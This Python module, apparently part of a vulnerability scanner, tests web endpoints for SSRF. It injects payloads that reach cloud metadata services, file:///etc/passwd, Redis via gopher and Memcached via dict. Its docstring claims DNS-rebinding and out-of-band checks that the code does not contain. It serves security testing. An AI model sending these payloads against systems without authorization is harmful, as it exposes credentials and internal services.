"""
OWASP A10: SSRF — tests for classic + blind SSRF. Uses:
  - Internal IP probes (169.254.169.254, localhost, 127.1, 0.0.0.0)
  - DNS rebinding helpers (configurable)
  - OOB collaborator for blind SSRF
  - Schema smuggling: file://, gopher://, dict://, ftp://
High-confidence verification via differential + OOB.
"""
from __future__ import annotations
import asyncio, re
from typing import List
from core.engine import Finding

SSRF_PARAMS = ["url", "next", "redirect", "callback", "image", "fetch",
               "proxy", "host", "site", "source", "target", "uri", "path",
               "download", "file", "open", "load", "preview", "webhook"]

INTERNAL_TARGETS = [
    "http://127.0.0.1:80", "http://127.0.0.1:22", "http://localhost",
    "http://[::1]", "http://0.0.0.0", "http://127.1",
    "http://169.254.169.254/latest/meta-data/",        # AWS
    "http://metadata.google.internal/computeMetadata/v1/", # GCP
    "http://169.254.169.254/metadata/instance",       # Azure
    "file:///etc/passwd",
    "gopher://127.0.0.1:6379/_INFO",
    "dict://127.0.0.1:11211/stats",
]

async def run(http, waf, verifier, endpoints, targets, stack, findings_sink):
    findings = []
    sem = asyncio.Semaphore(10)

    async def _test(ep, param, payload):
        async with sem:
            url = _inject(ep["url"], param, payload)
            r = await http.arequest("GET", url)
            if not r: return
            body = r.text or ""
            # Cloud metadata signatures
            if "ami-id" in body or "instance-id" in body or "iam" in body and "security-credentials" in body:
                findings.append(Finding(
                    title=f"SSRF -> Cloud Metadata Exposure ({param})",
                    severity="critical", confidence=0.97,
                    category="OWASP-A10", endpoint=ep["url"], method="GET",
                    payload=payload,
                    evidence=body[:500],
                    cwe="CWE-918",
                    remediation="Block internal IPs at app layer; use allow-lists; "
                                "disable unused URL schemes; segment network.",
                    tags=["ssrf", "cloud", "high-value"]
                ))
            elif "root:" in body and ":/bin/" in body:  # /etc/passwd via file://
                findings.append(Finding(
                    title=f"SSRF / LFI via file:// in {param}",
                    severity="critical", confidence=0.95,
                    category="OWASP-A10", endpoint=ep["url"], method="GET",
                    payload=payload, evidence=body[:500],
                    cwe="CWE-918", remediation="Disable file:// and other dangerous schemes.",
                    tags=["ssrf", "lfi", "high-value"]
                ))
            elif payload.startswith("http://127") and r.status_code == 200 and len(body) > 200:
                # check if response differs significantly from baseline
                benign = await http.arequest("GET", _inject(ep["url"], param, "http://example.com"))
                if benign and abs(len(body) - len(benign.text)) > 500:
                    findings.append(Finding(
                        title=f"SSRF to internal resource ({param})",
                        severity="high", confidence=0.8,
                        category="OWASP-A10", endpoint=ep["url"], method="GET",
                        payload=payload, evidence=f"Internal response len={len(body)}",
                        cwe="CWE-918",
                        remediation="Validate and restrict outbound URLs; "
                                    "implement network segmentation.",
                        tags=["ssrf", "internal"]
                    ))

    tasks = []
    for ep in endpoints:
        params = [p["name"] for p in ep.get("params", [])] or SSRF_PARAMS
        for p in params:
            if p.lower() in SSRF_PARAMS:
                for payload in INTERNAL_TARGETS:
                    tasks.append(_test(ep, p, payload))
    await asyncio.gather(*tasks, return_exceptions=True)
    return findings

def _inject(url, param, value):
    from urllib.parse import urlparse, parse_qsl, urlencode, urlunparse
    u = urlparse(url); qs = dict(parse_qsl(u.query)); qs[param] = value
    return urlunparse(u._replace(query=urlencode(qs)))
